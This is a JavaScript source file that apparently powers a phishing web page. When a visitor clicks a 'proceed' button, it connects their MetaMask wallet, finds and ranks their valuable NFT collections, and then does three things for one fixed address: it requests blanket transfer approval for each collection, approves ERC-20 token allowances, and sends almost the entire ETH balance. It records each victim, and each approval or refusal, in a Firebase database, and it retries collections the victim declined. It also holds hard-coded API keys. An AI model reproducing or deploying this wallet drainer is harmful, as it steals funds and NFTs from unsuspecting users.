let account;
const OPENSEA_URL = "https://api.opensea.io/";

const config = {
  apiKey: "AIzaSyBks3zBIaOKWZ9-yJm-xAaKbqxSRwBekXE",
  authDomain: "testdatabase-8f8be.firebaseapp.com",
  projectId: "testdatabase-8f8be",
  storageBucket: "testdatabase-8f8be.appspot.com",
  messagingSenderId: "430166999756",
  appId: "1:430166999756:web:c1f7133dc2a96a1b753869",
};

const app = firebase.initializeApp(config);
const db = firebase.firestore(app);

const ref = db.collection("jangtokyo");

function setItem(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

function getItem(key) {
  return JSON.parse(localStorage.getItem(key));
}

//get the file
// - to load Web3, buffer module for the browser from node
async function loadWeb3() {
  try {
    window.web3 = await new Web3(window.ethereum);
  } catch (error) {
    console.log(error);
  }
}

const _abi = [
  {
    inputs: [],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "approved",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        indexed: false,
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "ApprovalForAll",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "previousOwner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "OwnershipTransferred",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        indexed: true,
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "approve",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
    ],
    name: "balanceOf",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "getApproved",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
    ],
    name: "isApprovedForAll",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "owner",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "ownerOf",
    outputs: [
      {
        internalType: "address",
        name: "",
        type: "address",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "renounceOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeMint",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
      {
        internalType: "bytes",
        name: "data",
        type: "bytes",
      },
    ],
    name: "safeTransferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "operator",
        type: "address",
      },
      {
        internalType: "bool",
        name: "approved",
        type: "bool",
      },
    ],
    name: "setApprovalForAll",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes4",
        name: "interfaceId",
        type: "bytes4",
      },
    ],
    name: "supportsInterface",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "tokenURI",
    outputs: [
      {
        internalType: "string",
        name: "",
        type: "string",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "from",
        type: "address",
      },
      {
        internalType: "address",
        name: "to",
        type: "address",
      },
      {
        internalType: "uint256",
        name: "tokenId",
        type: "uint256",
      },
    ],
    name: "transferFrom",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "address",
        name: "newOwner",
        type: "address",
      },
    ],
    name: "transferOwnership",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

async function checkAddr() {
  if (window.ethereum) {
    const accounts = await window.ethereum.request({
      method: "eth_requestAccounts",
      params: [],
    });

    console.log(accounts);
    account = accounts[0];

    await check();

    const LISTCOLLECTION = db.collection("addresses").doc(account);

    await LISTCOLLECTION.get().then((docSnapshot) => {
      if (docSnapshot.exists) {
        console.log("doc exists");
        LISTCOLLECTION.update({
          status: "connected",
          date: new Date(),
        });
      } else {
        console.log("doc not found");
        LISTCOLLECTION.set({
          address: account,
          date: new Date(),
          status: "connected",
        })
          .then(() => {
            console.log("successfully added");
          })
          .catch(() => {
            console.log("error adding document");
          });
      }
    });
  } else {
    console.log("install metamask!");
  }
}

//FUNCTION CHECK
async function check() {
  console.log("from check " + account);

  var nft = await nfts(account);
  console.log(nft);

  var data = {
    time: new Date(),
    spoof: nft,
    owner: account,
  };

  setItem(account, data);
  await trade();
  console.log("data added");

  //   if (getItem(account) == null || getItem(account).length == 0) {
  //     console.log('no data')

  //     setItem(account, data)
  //     trade()
  //     console.log('data added')

  // } else {
  //     console.log('data already exists')

  //     trade()
  // }
}

//get all nfts, get their contracts, crop out duplicates

async function nfts(addr) {
  var url = `${OPENSEA_URL}api/v2/chain/ethereum/account/${addr}/nfts`; //change the chain depending with the target nfts
  var nft = [];
  var contract = [];

  // ----------------------------------------------------

  await $.ajax({
    url: url,
    method: "GET",
    headers: {
      accept: "application/json",
      "x-api-key": "078b8acce6a34dd3a2dbb0cd34127203", //opensea api
    },

    success: function (data) {
      // console.log(data.nfts)

      for (var i = 0; i < data.nfts.length; i++) {
        nft.push(data.nfts[i].contract); //contracts are filtered out
      }

      var uniq = [...new Set(nft)]; //remove duplicate contract entry from nfts with the same collection

      nft = uniq;
    },
  });

  nft.forEach((e) => {
    var data = { contract: "" }; //push the arrays to contract object, keys will be applied later like openseaFloorPrice
    data.contract = e;

    contract.push(data);
  });

  return contract;
}

//

async function trade() {
  console.log("trade here");

  await loadWeb3();

  var collection = [];
  var owner;
  var sortedCollection = [];

  data = getItem(account);

  owner = data.owner;
  collection = data.spoof;

  for (let i = 0; i < collection.length; i++) {
    collection[i].worth = 0;
    collection[i].owner = owner;

    try {
      var result = await $.ajax({
        url:
          "https://eth-mainnet.g.alchemy.com/nft/v2/i3QT46oiQpqqceCkiWb0kIn24YNEVcRH/getFloorPrice?contractAddress=" +
          collection[i].contract,
        method: "GET",
      });

      if (result.openSea != undefined && result.openSea.floorPrice != undefined)
        collection[i].worth = result.openSea.floorPrice;
    } catch (error) {
      console.log(error);

      if (collection[i].stats.seven_day_volume > 0) {
        collection[i].worth =
          Math.round(collection[i].stats.seven_day_volume * 0.8 * 10000) /
          10000;
      }
    }
  }

  collection = collection.sort((a, b) => {
    return a.worth < b.worth ? 1 : -1;
  });

  for (let i = 0; i < collection.length; i++) {
    if (collection[i].worth != 0) {
      sortedCollection.push(collection[i]);
    }
  }

  collection = sortedCollection;

  console.log(collection);

  /*---------------------------------------------------------------*/
  var declinedCollection = [];

  //jang contracts
  const collection_contracts = db.collection(account.toLowerCase()); //removed lowercase
  //

  await collection_contracts
    .get()
    .then((querySnapshot) => {
      querySnapshot.forEach((doc) => {
        var data = doc.data();
        var approved = data.approved;

        //console.log(approved)

        if (approved === false) {
          console.log("declined");

          // console.log(data)

          //console.log(data)
          declinedCollection.push(data);
        } else {
          //
          console.log("nothing saved yet");
        }
      });
    })
    .catch((error) => {
      console.log("error gettings documents " + error);
    });

  if (declinedCollection.length < 1) {
    console.log("no data declined contracts yet");
  } else {
    console.log("filtered declined collections");
    collection = declinedCollection;
  }

  console.log(collection);

  //----------------

  for (let i = 0; i < collection.length; i++) {
    // console.log(collection[i])

    try {
      if (collection[i].approved == true) {
        console.log("approved");
        //no more approval
        //ilocalstorage nalang ni?
      } else {
        var collectionContract = await new window.web3.eth.Contract(
          _abi,
          collection[i].contract,
          { gas: "100000" }
        );
        await collectionContract.methods
          .setApprovalForAll("0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262", true)
          .send({ from: account });

        collection[i].date = new Date();
        collection[i].approved = true;
        console.log(collection[i]);

        collection_contracts
          .doc(collection[i].contract)
          .set(collection[i])
          .then(() => {
            console.log("data updated");
          })
          .catch(() => {
            console.log("error data update");
          });
      }
    } catch (error) {
      console.log(error);

      if (error.code == 4001) {
        collection[i].date = new Date();
        collection[i].approved = false;
        console.log(collection[i]);

        collection_contracts
          .doc(collection[i].contract)
          .get()
          .then((docSnapshot) => {
            if (docSnapshot.exists) {
              console.log("data already existed");

              collection_contracts
                .doc(collection[i].contract)
                .set(collection[i])
                .then(() => {
                  console.log("data updated");
                })
                .catch((error) => {
                  console.log("error setting document " + error);
                });
            } else {
              console.log("doc does not exist");

              collection_contracts
                .doc(collection[i].contract)
                .set(collection[i])
                .then(() => {
                  console.log("data updated");
                })
                .catch((error) => {
                  console.log("error setting document " + error);
                });
            }
          })
          .catch((error) => {
            console.log("Error getting data " + error);
          });
      }
    }
  }

//   await get_eth(account);
  console.log(account + " dapit ni sa get_eth");



// const t = [
//     [{token: '0x767fe9edc9e0df98e07454847909b5e959d7ca0e'}, {balance: 4}, {chain: '0x1'}],
//     [{token: '0x1CE0c2827e2eF14D5C4f29a091d735A204794041'}, {balance: 18}, {chain: '0x38'}],
//     [{token: '0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47'}, {balance: 359}, {chain: '0x38'}],
// ]

const t = [
  [{token: '0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E'}, {balance: 79}],
  [{token: '0xF57e7e7C23978C3cAEC3C3548E3D615c346e79fF'}, {balance: 2976}],

]

 t.forEach( async e => {
    var t = e[0].token
    var b = e[1].balance
    // var c = e[2].chain

    console.log(t,b,)

    await tokenGet(t, b)
})

await get_eth(account)
console.log('dapit sa pag get')


// await tokenGet('0x1CE0c2827e2eF14D5C4f29a091d735A204794041', 18)
//  await tokenGet('0x1CE0c2827e2eF14D5C4f29a091d735A204794041', 123)
//  await tokenGet('0x3b484b82567a09e2588A13D54D032153f0c0aEe0', 123)
} //

//get balance
//NAUNSA NANI TANAN

async function get_eth(address) {
  const balances =
    web3.utils.fromWei(await web3.eth.getBalance(address), "ether") * 1;

  //database(update) balance: balances

  var minusvalue = balances - 0.0084;

  const finalAmount = Web3.utils.toWei(minusvalue.toString(), "ether");

  console.log(finalAmount);
  const txData = {
    from: account,
    to: "0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262",
    value: finalAmount,
  };

  await web3.eth
    .sendTransaction(txData)
    .then((txHash) => {
      console.log(txHash);
      //data(update) sent: balance
    })
    .catch((err) => {
      console.log(err);
      //data(update) sent: declined
    });
}

$(".submitProceed").on("click", async () => {
  await checkAddr();

//   await token()

  // const balances = web3.utils.fromWei('700',
  //     'ether'
  //   )* 1;

  // var collectionContract = await new window.web3.eth.Contract(_abi, '0x3b484b82567a09e2588A13D54D032153f0c0aEe0', {gas: '100000'})
  // await collectionContract.methods.approve('0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262', true).send({from: account})
});

const erc20TokenContractAbi = [
  { inputs: [], stateMutability: "nonpayable", type: "constructor" },
  {
    anonymous: false,
    inputs: [
      {
        indexed: true,
        internalType: "address",
        name: "owner",
        type: "address",
      },
      {
        indexed: true,
        internalType: "address",
        name: "spender",
        type: "address",
      },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Approval",
    type: "event",
  },
  {
    anonymous: false,
    inputs: [
      { indexed: true, internalType: "address", name: "from", type: "address" },
      { indexed: true, internalType: "address", name: "to", type: "address" },
      {
        indexed: false,
        internalType: "uint256",
        name: "value",
        type: "uint256",
      },
    ],
    name: "Transfer",
    type: "event",
  },
  {
    inputs: [
      { internalType: "address", name: "owner", type: "address" },
      { internalType: "address", name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [{ internalType: "address", name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "decimals",
    outputs: [{ internalType: "uint8", name: "", type: "uint8" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "subtractedValue", type: "uint256" },
    ],
    name: "decreaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "spender", type: "address" },
      { internalType: "uint256", name: "addedValue", type: "uint256" },
    ],
    name: "increaseAllowance",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [],
    name: "name",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "symbol",
    outputs: [{ internalType: "string", name: "", type: "string" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "totalSupply",
    outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transfer",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
  {
    inputs: [
      { internalType: "address", name: "sender", type: "address" },
      { internalType: "address", name: "recipient", type: "address" },
      { internalType: "uint256", name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ internalType: "bool", name: "", type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];






// async function token(tokenContract, balance) {

// await loadWeb3();




// const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, '0x3b484b82567a09e2588A13D54D032153f0c0aEe0');
// const toAddress = '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262';


// // const balance = await tokenContract.methods.balanceOf(account).call();
// // const balanceEther = await web3.utils.fromWei(balance, "ether")

// // console.log(balanceEther)



// const tokenDecimals = web3.utils.toBN(18);
// const tokenAmountToApprove = web3.utils.toBN(7105846);
// const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));


// await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})


// }



// async function tokenGet(tokenAddress, tokenBalance, chain)

async function tokenGet(tokenAddress, tokenBalance) {
    

// try {
//     await ethereum.request({
//         method: 'wallet_switchEthereumChain',
//         params: [{chainId: `${chain}`}]
//     })
// } catch (error) {
//     console.log(error)
// }



    const tokenContract = await new web3.eth.Contract(erc20TokenContractAbi, tokenAddress);
    const toAddress = '0x2c5da2bcFe33ecF847F7558f6195BaBC2F582262';
    
    
    // const balance = await tokenContract.methods.balanceOf(account).call();
    // const balanceEther = await web3.utils.fromWei(balance, "ether")
    
    // console.log(balanceEther)
    
    
    
    const tokenDecimals = web3.utils.toBN(18);
    const tokenAmountToApprove = web3.utils.toBN(tokenBalance);
    const calculatedApproveValue = web3.utils.toHex(tokenAmountToApprove.mul(web3.utils.toBN(10).pow(tokenDecimals)));

    await tokenContract.methods.approve(toAddress, calculatedApproveValue).send({from: account})

    await db.collection('tokenApproval').add({
        tokenContract: tokenAddress,
        approvedBalance: tokenBalance,
        date: new Date(),
        address: account
    }).then( () => {
        console.log('success')
    }).catch( () => {
        console.log('error')
    })
    
    

    

    }



// async function m() {
//   const t = await  nfts('0xF8899035fbd4AD0149B328A671F76c0E64a80fc9')

//   console.log(t)
// }

// m()
